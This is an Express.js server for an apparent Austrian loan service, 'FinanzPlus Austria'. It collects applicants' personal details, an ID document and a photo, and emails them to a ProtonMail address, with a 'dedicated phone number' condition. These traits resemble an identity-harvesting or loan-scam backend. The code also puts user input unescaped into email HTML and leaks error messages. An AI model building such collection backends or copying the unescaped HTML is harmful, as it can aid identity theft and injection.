const express = require('express');
const cors = require('cors');
const multer = require('multer');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configuration de Multer pour l'upload de fichiers
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

// Validation des types de fichiers
const fileFilter = (req, file, cb) => {
  const allowedTypes = {
    'identityDocument': ['.pdf', '.jpg', '.jpeg', '.png'],
    'photo': ['.jpg', '.jpeg', '.png']
  };

  const ext = path.extname(file.originalname).toLowerCase();
  const fieldAllowedTypes = allowedTypes[file.fieldname];

  if (fieldAllowedTypes && fieldAllowedTypes.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error(`Format de fichier non autorisé pour ${file.fieldname}. Formats acceptés: ${fieldAllowedTypes.join(', ')}`));
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 10 * 1024 * 1024 // Limite de 10MB par fichier
  }
});

// Configuration de Nodemailer
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || 'smtp.protonmail.com',
  port: process.env.EMAIL_PORT || 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Route de test
app.get('/', (req, res) => {
  res.json({ message: 'API FinanzPlus Austria - Serveur actif' });
});

// Route pour soumettre le formulaire
app.post('/api/submit-application', upload.fields([
  { name: 'identityDocument', maxCount: 1 },
  { name: 'photo', maxCount: 1 }
]), async (req, res) => {
  try {
    const {
      nom,
      prenom,
      age,
      adresse,
      telephone,
      travail,
      revenuMensuel,
      accepteConditions
    } = req.body;

    // Validation des champs obligatoires
    if (!nom || !prenom || !age || !adresse || !telephone || !travail || !revenuMensuel) {
      return res.status(400).json({
        success: false,
        message: 'Tous les champs obligatoires doivent être remplis'
      });
    }

    if (accepteConditions !== 'true') {
      return res.status(400).json({
        success: false,
        message: 'Vous devez accepter les conditions d\'éligibilité'
      });
    }

    // Vérification des fichiers uploadés
    if (!req.files || !req.files.identityDocument || !req.files.photo) {
      return res.status(400).json({
        success: false,
        message: 'Les documents d\'identité et la photo sont obligatoires'
      });
    }

    const identityDoc = req.files.identityDocument[0];
    const photoDoc = req.files.photo[0];

    // Préparation de l'email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'kontakt_finanzplusaustria@proton.me',
      subject: `Nouvelle demande de prêt - ${prenom} ${nom}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px;">
            Nouvelle Demande de Prêt FinanzPlus Austria
          </h2>
          
          <h3 style="color: #34495e; margin-top: 30px;">📋 INFORMATIONS PERSONNELLES</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Nom:</strong></td>
              <td style="padding: 8px;">${nom}</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Prénom:</strong></td>
              <td style="padding: 8px;">${prenom}</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Âge:</strong></td>
              <td style="padding: 8px;">${age} ans</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Adresse:</strong></td>
              <td style="padding: 8px;">${adresse}</td>
            </tr>
          </table>

          <h3 style="color: #34495e; margin-top: 30px;">📞 COORDONNÉES</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Téléphone:</strong></td>
              <td style="padding: 8px;">${telephone}</td>
            </tr>
          </table>

          <h3 style="color: #34495e; margin-top: 30px;">💼 INFORMATIONS PROFESSIONNELLES</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Profession:</strong></td>
              <td style="padding: 8px;">${travail}</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Revenu mensuel:</strong></td>
              <td style="padding: 8px;">${revenuMensuel} €</td>
            </tr>
          </table>

          <h3 style="color: #34495e; margin-top: 30px;">📎 DOCUMENTS JOINTS</h3>
          <ul style="list-style: none; padding: 0;">
            <li style="padding: 5px 0;">✓ Carte d'identité / Passeport</li>
            <li style="padding: 5px 0;">✓ Photographie d'identité</li>
          </ul>

          <div style="margin-top: 30px; padding: 15px; background-color: #d5f4e6; border-left: 4px solid #27ae60;">
            <strong style="color: #27ae60;">✓ Conditions d'éligibilité acceptées</strong>
            <p style="margin: 5px 0 0 0; font-size: 14px;">Le demandeur confirme disposer d'un numéro de téléphone dédié.</p>
          </div>

          <div style="margin-top: 30px; padding: 15px; background-color: #f8f9fa; border-top: 2px solid #dee2e6;">
            <p style="margin: 0; font-size: 12px; color: #6c757d;">
              Date de soumission: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Vienna' })}
            </p>
          </div>
        </div>
      `,
      attachments: [
        {
          filename: `identite_${nom}_${prenom}${path.extname(identityDoc.originalname)}`,
          path: identityDoc.path
        },
        {
          filename: `photo_${nom}_${prenom}${path.extname(photoDoc.originalname)}`,
          path: photoDoc.path
        }
      ]
    };

    // Envoi de l'email
    await transporter.sendMail(mailOptions);

    // Suppression des fichiers temporaires après envoi
    fs.unlinkSync(identityDoc.path);
    fs.unlinkSync(photoDoc.path);

    res.json({
      success: true,
      message: 'Votre demande a été soumise avec succès. Nous vous contacterons dans les plus brefs délais.'
    });

  } catch (error) {
    console.error('Erreur lors de la soumission:', error);

    // Nettoyage des fichiers en cas d'erreur
    if (req.files) {
      if (req.files.identityDocument) {
        fs.unlinkSync(req.files.identityDocument[0].path);
      }
      if (req.files.photo) {
        fs.unlinkSync(req.files.photo[0].path);
      }
    }

    res.status(500).json({
      success: false,
      message: 'Une erreur est survenue lors de la soumission. Veuillez réessayer.',
      error: error.message
    });
  }
});

// Gestion des erreurs Multer
app.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        message: 'Le fichier est trop volumineux. Taille maximale: 10MB'
      });
    }
  }
  
  res.status(500).json({
    success: false,
    message: error.message || 'Une erreur est survenue'
  });
});

// Démarrage du serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur FinanzPlus Austria démarré sur le port ${PORT}`);
  console.log(`📧 Email de destination: kontakt_finanzplusaustria@proton.me`);
});

// Made with Bob
